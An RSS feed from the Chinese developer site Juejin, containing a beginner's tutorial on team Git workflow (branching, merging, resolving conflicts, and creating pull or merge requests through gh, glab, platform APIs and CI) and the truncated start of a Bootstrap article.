<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[初来乍到公司，git不会用，怎么在团队里写代码？]]></title>    <link>https://juejin.cn/post/7592069432227414025</link>    <guid>https://juejin.cn/post/7592069432227414025</guid>    <pubDate>2026-01-06T10:18:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592069432227414025" data-draft-id="7591788451029811243" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="初来乍到公司，git不会用，怎么在团队里写代码？"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-06T10:18:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="江湖文人"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            初来乍到公司，git不会用，怎么在团队里写代码？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3044986347066480/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    江湖文人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:18:38.000Z" title="Tue Jan 06 2026 10:18:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bb4d8a9a6964f75ac30a22a743392bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rGf5rmW5paH5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768299518&amp;x-signature=b1MbD1%2FZXknFYSqiq294NFt7po8%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-0">线上环境 main/master 分支。</h2>
<p>运行的都是稳定代码。</p>
<h2 data-id="heading-1">测试环境 feature分支。</h2>
<p>日常需求开发中、你新增的代码都是基于master创建一个对应此需求的feature分支来开发。</p>
<h2 data-id="heading-2">上线</h2>
<p><code>feature -&gt; master</code></p>
<p>让<code>master</code>的代码中具备你在<code>feature</code>分支中新开发的代码。</p>
<h2 data-id="heading-3">流程</h2>
<p><code>main</code>分支：功能 1 2 3<br/>
<code>feature</code>分支：新增功能4</p>
<pre><code class="hljs language-js" lang="js">本地仓库  远程仓库
本地仓库的分支 对应有 远程仓库的 相同分支。
</code></pre>
<ul>
<li>
<p>1、拉取“远程仓库”<code>master</code>的最新代码【此时你<code>idea</code>里拉下来的代码就属于“本地仓库”的<code>master</code>代码】</p>
<ul>
<li>经常吧代码拉下来看看，这就拉下来了。</li>
<li>此时你需要开发功能。</li>
</ul>
</li>
<li>
<p>2、基于“本地仓库”<code>master</code>代码、创建一个“本地仓库”特性开发分支，命名为<code>feature_add_4</code></p>
</li>
<li>
<p>3、然后就可以开始写代码了。在“本地仓库”的<code>feature_add_4</code>分支中开发你的新代码。</p>
</li>
<li>
<p>4、将“本地仓库”的<code>faeture_add_4</code>代码直接推送到远程对应该特性分支。</p>
</li>
<li>
<p>5、开始测试你的代码等等。</p>
</li>
<li>
<p>6、feature ---&gt; release ---&gt; master</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-4">例子</h2>
<h3 data-id="heading-5">老大创仓库</h3>
<p>平台选择，使用<code>gitee</code>作为平台，同名仓库有两种形态（1、<strong>本地</strong>：类似于本地文件夹；2、<strong>远程</strong>： 网络，类似于网盘文件夹别人可以访问到，进行一个远程管理，暂放托管）。</p>
<h3 data-id="heading-6">创建仓库</h3>
<p>老大创一个私人的仓库。</p>
<p>接着他会发一个邀请链接，邀请你进来共同开发这个项目。</p>
<h3 data-id="heading-7">配置ssh密钥</h3>
<p>此时，我们要配置一个<code>ssh密钥</code>，以前很多仓库是用户名密码，现在几乎全部都是密钥。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40dbcb5ad2204b1792be581ec621d738~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rGf5rmW5paH5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768299518&amp;x-signature=UuyEubBJ8QfRmJy1jCHIL6CEM0Y%3D" alt="image.png" loading="lazy"/></p>
<p>ssh密钥就为了以后能远程动这个仓库，比如说pull、push等等操作。</p>
<h3 data-id="heading-8">拉取仓库</h3>
<pre><code class="hljs language-js" lang="js">git clone git@gitee.<span class="hljs-property">com</span>:zww0891/git-train.<span class="hljs-property">git</span>
</code></pre>
<h3 data-id="heading-9">延伸自己的分支</h3>
<p>自己创建一个分支，基于主分支创建一个自己的分支，这一步是方便代码隔离，不易出现一个地方出现bug后其余地方受牵连。</p>
<pre><code class="hljs language-js" lang="js">公司项目master

公司项目develop

员工A  员工B
</code></pre>
<p>如果直接在公司项目<code>master</code>上改代码万一出问题就很不好。所以说<code>master</code>是最终备份，<code>develop</code>是开发备份，我们各个员工分不同功能也是相同于一份一份这样子的备份。</p>
<p>比如说我是<code>员工A</code>，那么我开发完<code>a功能</code>，那我就要在公司项目<code>develop</code>上延伸出自己的分支，比如说<code>feature</code>分支，然后在这个<code>feature</code>分支上进行代码修改，开发功能完成，推到<code>develop</code>上的自己的<code>feature</code>分支，如果没问题或者pr代码检查过后没问题，然后<code>merge</code>到公司项目的<code>develop</code>分支，这个开发功能就完毕了。可以在公司项目develop上先在测试域名上测开发效果，确实真的没问题了，再最终合并到公司项目master分支。</p>
<h3 data-id="heading-10">同步别人的代码</h3>
<p>别人的代码推到公司项目develop分支了，你切换到本地的develop分支，同步远程的develop最新代码，然后再合并到自己的开发分支。</p>
<p>这个时候咱的开发分支就能看到别人推的在远程develop分支上的新代码了。</p>
<p>就是Dao（二声）过来Dao（二声）过去。</p>
<p>就是同一个分支名字本地和远程的就是<code>同步</code>，不同分支名字本地和本地的就是<code>合并</code>的意思。</p>
<pre><code class="hljs language-js" lang="js">远程develop
| 同步
本地develop ——（切到feature分支，然后合并本地develop代码）——  本地feature
</code></pre>
<h3 data-id="heading-11">解决冲突</h3>
<p>比如说同事C也改了同一个文件比如说<code>a.txt</code>，并且，先于你提交到线上的<code>develop</code>分支。</p>
<p>你在本地也改了<code>a.txt</code>文件。</p>
<p>这个时候，</p>
<h4 data-id="heading-12">第一步：拉取最新的 develop 代码</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1.1 保存你当前的工作（确保所有修改已提交）</span>
git checkout feature // 这一步可以不做，因为只是要确认我们当前是在功能修改的feature分支
git add .
git commit -m <span class="hljs-string">"feat: 功能开发"</span>

<span class="hljs-comment"># 1.2 切换到 develop 分支并拉取最新代码</span>
git checkout develop
git pull origin develop

<span class="hljs-comment"># 1.3 切换回 feature 分支</span>
git checkout feature
</code></pre>
<h4 data-id="heading-13">第二步：合并最新代码 并 解决冲突</h4>
<p>用<code>merge</code></p>
<pre><code class="hljs language-js" lang="js"># 合并 develop 到 feature 分支
git merge develop <span class="hljs-comment">// 这里也可以用git rebase develop变基</span>
</code></pre>
<p><code>这个时候就会出现冲突，git这个时候会显示报错有冲突。</code></p>
<p>如果你没有图形界面工具看不出来就用命令行：</p>
<pre><code class="hljs language-bash" lang="bash">git status
</code></pre>
<p>出来这个信息：</p>
<pre><code class="hljs language-bash" lang="bash">Unmerged paths:
  (use <span class="hljs-string">"git add &lt;file&gt;..."</span> to mark resolution)
  both modified:   example.py
</code></pre>
<p>然后就去看哪个文件冲突了，是谁跟你冲突了，跟他沟通一样用谁的。</p>
<pre><code class="hljs language-bash" lang="bash">def some_function():
&lt;&lt;&lt;&lt;&lt;&lt;&lt; <span class="hljs-string">HEAD
    # 你的修改内容
    return "your changes"
=======
    # 同事A的修改内容
    return "colleague A's changes"
&gt;&gt;&gt;&gt;&gt;&gt;&gt; develop
</span></code></pre>
<p>手动解决冲突，保留你的还是他的，还是合并两者，改完之后：</p>
<pre><code class="hljs language-bash" lang="bash">def some_function():
    <span class="hljs-comment"># 合并后的解决方案</span>
    <span class="hljs-comment"># 可能保留你的逻辑，加入同事的功能</span>
    result = process_data()
    <span class="hljs-built_in">return</span> <span class="hljs-string">"merged solution: "</span> + result
</code></pre>
<h4 data-id="heading-14">第三步：完成合并merge/变基rebase</h4>
<p>merge合并的方式</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1、标记冲突已解决</span>
git add a.py

<span class="hljs-comment"># 2、继续完成合并</span>
git commit
<span class="hljs-comment"># Git 会自动生成合并并提交信息，你可以修改或直接保存</span>

<span class="hljs-comment"># 3、验证合并</span>
git <span class="hljs-built_in">log</span> --oneline --graph
</code></pre>
<h4 data-id="heading-15">第四步：终极</h4>
<p>终极，有的公司要pr(pull request)；有的公司可能不用pr，直接推送到远程的develop分支就可以了。我们先来说一下不用pr，直接推的方式：</p>
<h5 data-id="heading-16">不用pr 直接推</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1、切换到develop分支</span>
git checkout develop

<span class="hljs-comment"># 2、确保是最新代码</span>
git pull origin develop

<span class="hljs-comment"># 3、合并 feature 分支</span>
git merge --no-ff feature // --no-ff 的意思是 --no-fast forward，作用是让合并历史更清晰，明确显示“这里曾经有过一个分支被合并进来”

<span class="hljs-comment"># 4、推送到远程</span>
git push origin develop
</code></pre>
<h5 data-id="heading-17">要pr 团队里有人审核代码</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1、推送 feature 分支到远程 merge的情况</span>
git push origin feature

<span class="hljs-comment"># 1、推送 feature 分支到远程 rebase的情况：如果之前推送过，现在需要强制推送（因为 rebase 改变了历史）</span>
git push origin feature -- force-widht-lease

<span class="hljs-comment"># 2、在代码平台创建 Merge Request / Pull Request // 这里面merge request 和 pull request 本质上是同一个概念，只是不同git平台使用的说法不同。</span>
<span class="hljs-comment"># - 源分支：feature</span>
<span class="hljs-comment"># - 目标分支：develop</span>
<span class="hljs-comment"># - 描述冲突解决情况</span>
</code></pre>
<h3 data-id="heading-18">pr详细讲解</h3>
<p>在代码平台创建 Merge Request / Pull Request // 这里面merge request 和 pull request 本质上是同一个概念，只是不同git平台使用的说法不同。</p>
<p>merge request: <code>gitlab</code></p>
<p>pull request: <code>github</code>、<code>gitee</code></p>
<p>都是一样的东西，只不过功能完全一样，都是请求将代码从一个分支合并到另一个分支。</p>
<p>在github的pr按钮：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bf80bc18cec4325b425dbda1c806889~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rGf5rmW5paH5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768299518&amp;x-signature=jUjNNzkWUd64qt4rBg%2F2VN0uHws%3D" alt="image.png" loading="lazy"/></p>
<p>可以理解为：想要把自己的代码合到对应分支里面的请求。（<strong>PR/MR 是发起从 <code>源分支</code> 到 <code>目标分支</code> 的合并请求的流程</strong>）</p>
<p><strong>在平台创建</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">-</span>   在 GitLab 上：进入项目 -&gt; 侧边栏 <span class="hljs-strong">**Merge Requests**</span> -&gt; 点击 <span class="hljs-strong">**New merge request**</span>。
<span class="hljs-bullet">-</span>   在 GitHub 上：进入项目 -&gt; 点击 <span class="hljs-strong">**Pull requests**</span> 标签页 -&gt; 点击 <span class="hljs-strong">**New pull request**</span>。
</code></pre>
<p><strong>Pull Request / Merge Request 本身是代码平台的协作功能，不能直接用标准的 Git 命令行创建，但可以通过平台 API 或 CLI 工具来实现命令行创建。</strong></p>
<p>标准的 Git 命令（<code>git add</code>, <code>git commit</code>, <code>git push</code>, <code>git merge</code> 等）只能处理本地仓库和远程仓库之间的同步，无法直接创建代码平台的 PR/MR，因为这是平台特有的协作功能</p>
<ol>
<li><strong>简单项目</strong>：直接使用平台网页界面创建 PR/MR</li>
<li><strong>高效开发者</strong>：安装并使用 <code>gh</code> 或 <code>glab</code> CLI 工具</li>
<li><strong>团队自动化</strong>：考虑在 CI/CD 中自动创建或使用脚本</li>
</ol>
<h4 data-id="heading-19">基本工作流</h4>
<p>基本工作流是这样的：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 切换到 feature 分支并推送</span>
git checkout feature
git push origin feature

<span class="hljs-comment"># 2. 现在 feature 分支已在远程，但还没有 PR/MR</span>
<span class="hljs-comment">#    你需要去平台网页界面创建，或者用下面的方法</span>
</code></pre>
<h4 data-id="heading-20">平台官方CLI工具</h4>
<p><strong>GitHub CLI (<code>gh</code>)</strong>
GitHub 提供了官方命令行工具，可以完全在终端创建和管理 PR：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 GitHub CLI</span>
<span class="hljs-comment"># macOS: brew install gh</span>
<span class="hljs-comment"># Linux/Windows: 查看官方安装指南</span>

<span class="hljs-comment"># 登录认证</span>
gh auth login

<span class="hljs-comment"># 创建 PR（会自动推送到远程）</span>
gh <span class="hljs-built_in">pr</span> create \
  --base develop \
  --<span class="hljs-built_in">head</span> feature \
  --title <span class="hljs-string">"添加新功能"</span> \
  --body <span class="hljs-string">"详细描述更改内容，包括冲突解决情况..."</span>

<span class="hljs-comment"># 其他有用命令</span>
gh <span class="hljs-built_in">pr</span> list           <span class="hljs-comment"># 列出 PR</span>
gh <span class="hljs-built_in">pr</span> view --web     <span class="hljs-comment"># 在浏览器打开当前 PR</span>
gh <span class="hljs-built_in">pr</span> merge --squash <span class="hljs-comment"># 合并 PR</span>
</code></pre>
<p><strong>GitLab CLI (<code>glab</code>)</strong>
GitLab 也有类似的官方 CLI 工具：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 GitLab CLI</span>
<span class="hljs-comment"># macOS: brew install glab</span>

<span class="hljs-comment"># 登录认证</span>
glab auth login

<span class="hljs-comment"># 创建 MR</span>
glab mr create \
  --source-branch feature \
  --target-branch develop \
  --title <span class="hljs-string">"添加新功能"</span> \
  --description <span class="hljs-string">"详细描述冲突解决情况..."</span>

<span class="hljs-comment"># 其他命令</span>
glab mr list         <span class="hljs-comment"># 列出 MR</span>
glab mr view --web   <span class="hljs-comment"># 在浏览器查看</span>
</code></pre>
<h4 data-id="heading-21">平台API</h4>
<p>可以用 <code>curl</code> 或任何 HTTP 客户端通过 API 创建：</p>
<p><strong>GitHub API 示例</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 curl 创建 GitHub PR</span>
curl -X POST \
  -H <span class="hljs-string">"Authorization: token YOUR_GITHUB_TOKEN"</span> \
  -H <span class="hljs-string">"Accept: application/vnd.github.v3+json"</span> \
  https://api.github.com/repos/用户名/仓库名/pulls \
  -d <span class="hljs-string">'{
    "title": "添加新功能",
    "body": "详细描述，包括冲突解决情况...",
    "head": "feature",
    "base": "develop"
  }'</span>
</code></pre>
<p><strong>GitLab API 示例</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 curl 创建 GitLab MR</span>
curl -X POST \
  -H <span class="hljs-string">"PRIVATE-TOKEN: YOUR_GITLAB_TOKEN"</span> \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  https://gitlab.com/api/v4/projects/项目ID/merge_requests \
  -d <span class="hljs-string">'{
    "source_branch": "feature",
    "target_branch": "develop",
    "title": "添加新功能",
    "description": "详细描述冲突解决情况..."
  }'</span>
</code></pre>
<h4 data-id="heading-22">脚本</h4>
<p>可以创建便捷的 shell 函数：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 添加到 ~/.bashrc 或 ~/.zshrc</span>
create-<span class="hljs-function"><span class="hljs-title">pr</span></span>() {
    <span class="hljs-built_in">local</span> branch_name=$(git branch --show-current)
    <span class="hljs-built_in">local</span> title=<span class="hljs-string">"Merge <span class="hljs-variable">$branch_name</span> to develop"</span>
    
    <span class="hljs-comment"># GitHub 用户</span>
    gh <span class="hljs-built_in">pr</span> create --base develop --<span class="hljs-built_in">head</span> <span class="hljs-string">"<span class="hljs-variable">$branch_name</span>"</span> --title <span class="hljs-string">"<span class="hljs-variable">$title</span>"</span> --body <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>
    
    <span class="hljs-comment"># 或者 GitLab 用户</span>
    <span class="hljs-comment"># glab mr create --source-branch "$branch_name" --target-branch develop --title "$title" --description "$1"</span>
}

<span class="hljs-comment"># 使用</span>
git add .
git commit -m <span class="hljs-string">"完成功能开发"</span>
create-pr <span class="hljs-string">"解决了与develop分支的冲突：1. utils.js中的方法合并 2. 配置文件兼容性调整"</span>
</code></pre>
<h4 data-id="heading-23">CI/CD</h4>
<p><strong>在 CI/CD 管道中自动创建 PR/MR</strong></p>
<p>很多团队在自动化流程中创建 PR：</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># GitLab CI 示例</span>
auto_create_mr:
  stage: deploy
  script:
    - |
      glab mr create \
        --source-branch $CI_COMMIT_BRANCH \
        --target-branch develop \
        --title <span class="hljs-string">"Auto MR for $CI_COMMIT_BRANCH"</span> \
        --description <span class="hljs-string">"自动创建的合并请求"</span>
  rules:
    - <span class="hljs-keyword">if</span>: $CI_COMMIT_BRANCH =~ <span class="hljs-regexp">/^feature/</span>
</code></pre>
<p>虽然 Git 本身不提供创建 PR/MR 的命令，但通过平台特定的 CLI 工具（<code>gh</code>/<code>glab</code>）或 API，你完全可以实现命令行创建工作流，这能大大提高效率，特别是在频繁创建 PR/MR 的情况下。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[轻松上手Bootstrap框架]]></title>    <link>https://juejin.cn/post/7592119218029248546</link>    <guid>https://juejin.cn/post/7592119218029248546</guid>    <pubDate>2026-01-06T09:58:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592119218029248546" data-draft-id="7592119218029199394" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="轻松上手Bootstrap框架"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-06T09:58:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Polaris_o"/> <meta itemprop="url" content="https://juejin.cn/user/1901532154435689"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            轻松上手Bootstrap框架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1901532154435689/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Polaris_o
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:58:58.000Z" title="Tue Jan 06 2026 09:58:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
